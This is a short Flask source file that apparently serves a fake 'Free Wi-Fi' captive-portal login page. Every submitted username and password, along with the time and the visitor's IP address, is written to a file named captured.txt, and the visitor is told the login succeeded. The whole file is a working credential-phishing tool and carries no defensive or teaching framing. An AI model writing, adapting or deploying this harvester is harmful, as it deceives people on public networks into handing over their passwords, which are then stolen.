from flask import Flask, request, render_template
import datetime

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        with open("captured.txt", "a") as f:
            f.write(f"Time: {datetime.datetime.now()}\n")
            f.write(f"Username: {request.form['username']}\n")
            f.write(f"Password: {request.form['password']}\n")
            f.write(f"IP: {request.remote_addr}\n\n")
        return "Login successfull. Enjoy Free Wi-Fi."
    return render_template("login.html")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
